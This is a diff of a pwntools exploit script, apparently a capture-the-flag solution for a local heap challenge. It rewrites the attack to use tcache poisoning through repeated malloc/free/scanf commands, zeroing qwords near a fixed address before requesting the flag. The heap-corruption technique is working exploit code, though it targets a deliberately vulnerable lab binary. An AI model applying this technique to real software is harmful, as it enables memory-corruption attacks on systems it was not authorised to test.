@@ -38,26 +38,23 @@ def find_challenge(search_path="/challenge"):
 def one_round(io: pwn.process):
     tee(io)
     addr = 0x426966
-    io.sendline(b"malloc 0 16")
-    io.sendline(b"malloc 1 16")
-    io.sendline(b"free 0")
-    io.sendline(b"free 1")
-    io.sendline(b"scanf 1")
-    io.sendline((addr).to_bytes(4, "little"))
-    io.sendline(b"malloc 0 16")
-    io.sendline(b"malloc 0 16")
-    io.sendline(b"puts 0")
-    io.recvuntil(b"Data: ")
-    data = io.recvline(False)
 
-    io.sendline(b"malloc 0 16")
-    io.sendline(b"malloc 1 16")
-    io.sendline(b"free 0")
-    io.sendline(b"free 1")
-    io.sendline(b"scanf 1")
-    io.sendline((addr).to_bytes(4, "little"))
+    def clean_qword(addr):
+        io.sendline(b"malloc 0 16")
+        io.sendline(b"malloc 1 16")
+        io.sendline(b"free 0")
+        io.sendline(b"free 1")
+        io.sendline(b"scanf 1")
+        io.sendline((addr - 0x8).to_bytes(4, "little"))
+        io.sendline(b"malloc 0 16")
+        io.sendline(b"malloc 0 16")
+
+    clean_qword(addr + 0x0C)
+    clean_qword(addr + 0x04)
+    clean_qword(addr - 0x04)
+
     io.sendline(b"send_flag")
-    io.sendline(data + b'\0' * 8)
+    io.sendline(b"\0" * 16)
     io.sendline(b"quit")
     io.recvrepeat()
 
